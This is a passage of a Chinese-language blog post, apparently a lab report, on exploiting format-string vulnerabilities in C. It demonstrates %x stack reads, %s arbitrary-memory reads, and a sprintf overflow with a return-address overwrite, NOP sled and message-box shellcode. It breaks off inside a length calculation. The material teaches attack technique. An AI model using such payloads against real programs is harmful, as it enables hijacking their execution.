<!DOCTYPE html><html lang="zh-CN"><head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
<link rel="preconnect" href="https://fonts.geekzu.org" crossorigin="">
<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="BDOes_2c0TiF0BOSphLeKhmHOej-Hk1dTMD5LcJq1I4">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.geekzu.org/css?family=Tahoma:300,300italic,400,400italic,700,700italic%7COpen+Sans:300,300italic,400,400italic,700,700italic%7CNoto+Serif+SC:300,300italic,400,400italic,700,700italic&amp;display=swap&amp;subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.jason0743.space","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"style":"flat"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script>

    <meta name="description" content="目标 通过几个例子来理解格式化输出函数漏洞的利用，使用 %s、%x、%n 格式操作符操作内存，完成给定 shellcode 调用。">
<meta property="og:type" content="article">
<meta property="og:title" content="格式化字符串">
<meta property="og:url" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/">
<meta property="og:site_name" content="随心记">
<meta property="og:description" content="目标 通过几个例子来理解格式化输出函数漏洞的利用，使用 %s、%x、%n 格式操作符操作内存，完成给定 shellcode 调用。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/1.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/2.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/3.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/4.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/5.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/6.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/7.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/8.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/9.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/11.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/10-ori.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/10-changed.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/12.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/IMG_20191225_120713.jpg">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/r1.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/r2.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/r3.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/r4.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/r5.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/r6.png">
<meta property="og:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/rsuccess.png">
<meta property="article:published_time" content="2019-12-25T12:32:14.000Z">
<meta property="article:modified_time" content="2023-06-04T08:34:47.067Z">
<meta property="article:author" content="Jason Ren">
<meta property="article:tag" content="网络空间安全">
<meta property="article:tag" content="软件安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/1.png">


<link rel="canonical" href="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/","path":"2019/12/25/experiments/security/software/string-format/","title":"格式化字符串"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>格式化字符串 | 随心记</title>
  







<link rel="dns-prefetch" href="https://blog-manage.jason0743.space/">
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style><link rel="alternate" href="/atom.xml" title="随心记" type="application/atom+xml">
</head>

<body itemscope="" itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope="" itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">随心记</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">展现安全态度</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="https://www.jason0743.space/#/about" rel="section external nofollow noreferrer" target="_blank"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-note"><a href="https://note.jason0743.space/" rel="section external nofollow noreferrer" target="_blank"><i class="fa fa-book fa-fw"></i>笔记</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87"><span class="nav-number">1.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4%E4%B8%8E%E7%BB%93%E6%9E%9C"><span class="nav-number">2.</span> <span class="nav-text">测试步骤与结果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#code-x-code-%E6%9F%A5%E7%9C%8B%E6%A0%88%E5%86%85%E5%AE%B9"><span class="nav-number">2.1.</span> <span class="nav-text">%x 查看栈内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code-s-code-%E6%9F%A5%E7%9C%8B%E6%8C%87%E5%AE%9A%E5%9C%B0%E5%9D%80%E5%86%85%E5%AE%B9"><span class="nav-number">2.2.</span> <span class="nav-text">%s 查看指定地址内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E6%93%8D%E4%BD%9C%E5%AF%B9%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">实际操作对格式化输出函数漏洞进行利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%BB%93%E8%AE%BA"><span class="nav-number">3.</span> <span class="nav-text">测试结论</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%80%83%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">思考题</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Jason Ren" src="/images/avatar-v1.png">
  <p class="site-author-name" itemprop="name">Jason Ren</p>
  <div class="site-description" itemprop="description">技术博客，偶尔放一些心情相关随笔</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">60</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">46</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">30</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/jasonren0403" title="GitHub → https://github.com/jasonren0403" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/theRealRev270" title="Twitter → https://twitter.com/theRealRev270" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.facebook.com/renjason1999/" title="Facebook → https://www.facebook.com/renjason1999/" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.instagram.com/jasonren0403/" title="Instagram → https://www.instagram.com/jasonren0403/" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
      </span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope="" itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/">

    <span hidden="" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar-v1.png">
      <meta itemprop="name" content="Jason Ren">
    </span>

    <span hidden="" itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="随心记">
      <meta itemprop="description" content="技术博客，偶尔放一些心情相关随笔">
    </span>

    <span hidden="" itemprop="post" itemscope="" itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="格式化字符串 | 随心记">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          格式化字符串
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-12-25 20:32:14" itemprop="dateCreated datePublished" datetime="2019-12-25T20:32:14+08:00">2019-12-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-06-04 16:34:47" itemprop="dateModified" datetime="2023-06-04T16:34:47+08:00">2023-06-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">实验</span></a>
        </span>
          ，
        <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AE%9E%E9%AA%8C/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">软件安全</span></a>
        </span>
          ，
        <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
        </span>
          ，
        <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BC%8F%E6%B4%9E/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" itemprop="url" rel="index"><span itemprop="name">格式化字符串</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="far fa-comment"></i>
    </span>
    <span class="post-meta-item-text">Waline：</span>
  
    <a title="waline" href="/2019/12/25/experiments/security/software/string-format/#waline" itemprop="discussionUrl">
      <span class="post-comments-count waline-comment-count" data-path="/2019/12/25/experiments/security/software/string-format/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-item" title="阅读次数">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span class="waline-pageview-count" data-path="/2019/12/25/experiments/security/software/string-format/"></span>
    </span>
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.8k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 ≈</span>
      <span>7 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="目标">目标</h2>
<p>通过几个例子来理解格式化输出函数漏洞的利用，使用 <code>%s</code>、<code>%x</code>、<code>%n</code> 格式操作符操作内存，完成给定 shellcode 调用。</p>
<span id="more"></span>
<h2 id="测试步骤与结果">测试步骤与结果</h2>
<h3 id="code-x-code-查看栈内容"><code>%x</code> 查看栈内容</h3>
<p>代码如下</p>
<figure class="highlight c"><figcaption><span>stackView.c</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">char</span> format[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(format,<span class="string">"%08x.%08x.%08x.%08x"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>执行 <code>printf</code> 时，第四个 <code>%x</code> 没有提供相应的参数，会显示该参数所在位置的栈内容。在本例为 <code>00132588h</code><img data-src="/2019/12/25/experiments/security/software/string-format/1.png" class="">
</li>
<li>此程序输出如下 <img data-src="/2019/12/25/experiments/security/software/string-format/2.png" class=""></li>
</ul>
<h3 id="code-s-code-查看指定地址内容"><code>%s</code> 查看指定地址内容</h3>
<p>代码如下</p>
<figure class="highlight c"><figcaption><span>memoryView.c</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">char</span> format[<span class="number">40</span>];</span><br><span class="line">	<span class="comment">//利用多个%x将%s对应的参数位置挪到存储地址77E61044的栈地址</span></span><br><span class="line">	<span class="built_in">strcpy</span>(format,<span class="string">"\x44\x10\xE6\x77%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s"</span>);</span><br><span class="line">	<span class="comment">//输出地址0x77E61044的内存</span></span><br><span class="line">	<span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>代码将要查看位于地址 <code>0x77E61044</code> 的内存内容。</li>
<li>前 3 个参数为提供的 3 个参数，后面的一群 <code>%x</code> 是为了将 <code>%s</code> 的参数对应到地址 <code>0x77e61044</code> 上，所以可以输出内存 <code>0x77e61044</code> 的内容直到遇到截断符。  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/4.png" class=""></div></div></div>
  <img data-src="/2019/12/25/experiments/security/software/string-format/5.png" class="" title="内存0x77e61044的内容">
</li>
<li>该段程序输出如下 <img data-src="/2019/12/25/experiments/security/software/string-format/6.png" class=""></li>
</ul>
<h3 id="实际操作对格式化输出函数漏洞进行利用">实际操作对格式化输出函数漏洞进行利用</h3>
<ol>
<li>
<p><code>sprintf()</code> 函数</p>
<ul>
<li><code>sprintf</code> 的函数原型是这样的：<code>int sprintf (char *buffer, const char *format, [argument] ...);</code>
<ul>
<li><code>buffer</code> 指针指向将要写入字符串的缓冲区</li>
<li><code>format</code> 格式化字符串</li>
<li><code>argument</code> 为可选参数</li>
</ul>
</li>
<li><code>sprintf</code> 函数的漏洞点在于它假定任意长度的缓冲区存在。</li>
</ul>
</li>
<li>
<p>shellcode 解析</p>
 <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> user[]=</span><br><span class="line"><span class="string">"%497d\x39\x4a\x42\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"</span></span><br><span class="line"><span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90"</span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>我们使用数组 <code>user</code> 作为用户的 “输入”，<code>\x39\x4a\x42\x00</code> 为 shellcode 的起始地址，用来覆盖函数的返回地址。<code>\x33\xdb</code> 开始是我们的弹框 shellcode。当调用 <code>sprintf</code> 时，它会读取一个参数以 <code>%497d</code> 的格式写入 outbuf，由于未提供该参数，会自动将栈地址 <code>0x0012fae0</code> 中的值视为该参数，即 <code>0x12ff80</code>。需要写入 <code>outbuf</code> 的总字符串长度为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.833ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 6556 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2222.4,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(4000.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(5056,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 